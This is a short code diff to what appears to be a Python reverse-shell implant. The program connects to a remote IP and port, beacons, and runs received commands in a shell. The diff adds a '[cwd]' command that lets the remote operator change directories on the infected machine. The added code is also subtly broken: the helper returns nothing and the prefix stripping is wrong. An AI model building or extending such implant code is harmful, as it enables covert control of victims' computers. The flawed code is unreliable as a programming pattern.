@@ -219,6 +219,10 @@ def get_cwd():
     if VERBOSE:
         print_info("PWD: {}".format(CURRENT_WORKING_DIR))
 
+def change_cwd(path):
+    chdir(path)
+    get_cwd()
+
 def beacon(conn, data):
     global BEACON_INTERVAL_SETTING
     global BEACON_INTERVAL_MEM
@@ -343,6 +347,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 send_data(conn, sys_info)
             elif "[pwd]" in data:
                 send_data(conn, getcwd())
+            elif "[cwd]" in data:
+                send_data(conn,change_cwd(data.lstrip("[cwd]")))
             else: # otherwise, we pass the received command to a shell process
                 #cmds = data.split()
                 if VERBOSE:
